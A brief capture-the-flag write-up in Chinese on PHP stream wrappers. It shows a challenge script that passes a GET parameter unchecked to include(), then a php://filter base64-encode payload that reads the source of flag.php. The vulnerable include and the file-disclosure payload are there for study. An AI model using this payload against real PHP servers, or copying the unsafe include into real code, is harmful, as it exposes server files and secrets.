#PHP伪协议 
```php
<?php
//WEB手要懂得搜索
//flag in ./flag.php

if(isset($_GET['filter'])){
    $file = $_GET['filter'];
    if(!preg_match("/flag/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
} 
```
payload:
要加convert.base64-encode
```url
?filter=php://filter/convert.base64-encode/resource=flag.php
```
